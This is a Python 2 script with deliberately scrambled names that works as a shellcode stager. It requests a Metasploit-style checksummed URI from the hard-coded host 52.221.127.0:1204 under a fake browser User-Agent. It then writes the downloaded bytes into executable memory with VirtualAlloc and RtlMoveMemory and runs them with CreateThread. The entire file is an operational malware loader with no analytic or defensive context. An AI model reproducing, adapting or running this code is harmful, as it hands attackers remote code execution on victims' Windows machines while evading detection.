import urllib2, string, random, struct, ctypes, time
def thwhGOaGQ(s): return sum([ord(ch) for ch in s]) % 0x100
def chxnPJTz():
	for x in xrange(64):
		QmzcBFHZ = ''.join(random.sample(string.ascii_letters + string.digits,3))
		JfPFRHrGbcNZd = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
		for TdYbWVJurlnKul in JfPFRHrGbcNZd:
			if thwhGOaGQ(QmzcBFHZ + TdYbWVJurlnKul) == 92: return QmzcBFHZ + TdYbWVJurlnKul
def CkDDBw(zLvhzBaEclMYvQb,qApAjQ):
	aaWyyw = urllib2.ProxyHandler()
	fCQScFcHvaHEdu = urllib2.build_opener(aaWyyw)
	urllib2.install_opener(fCQScFcHvaHEdu)
	XWnzReMZFbnjs = urllib2.Request("http://%s:%s/%s" %(zLvhzBaEclMYvQb,qApAjQ,chxnPJTz()), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})
	try:
		FcbarlfTiU = urllib2.urlopen(XWnzReMZFbnjs)
		try:
			if int(FcbarlfTiU.info()["Content-Length"]) > 100000: return FcbarlfTiU.read()
			else: return ''
		except: return FcbarlfTiU.read()
	except urllib2.URLError, e: return ''
def hTPcbosmWnEc(rPxNcqya):
	if rPxNcqya != "":
		SmzLkJiiC = bytearray(rPxNcqya)
		SwxZfDNakzKiGR = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(SmzLkJiiC)), ctypes.c_int(0x3000),ctypes.c_int(0x40))
		wMfjWCcQnM = (ctypes.c_char * len(SmzLkJiiC)).from_buffer(SmzLkJiiC)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(SwxZfDNakzKiGR),wMfjWCcQnM, ctypes.c_int(len(SmzLkJiiC)))
		xhVMaoHXMTxoX = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(SwxZfDNakzKiGR),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(xhVMaoHXMTxoX),ctypes.c_int(-1))
SVhhloZ = ''
SVhhloZ = CkDDBw("52.221.127.0", 1204)
hTPcbosmWnEc(SVhhloZ)
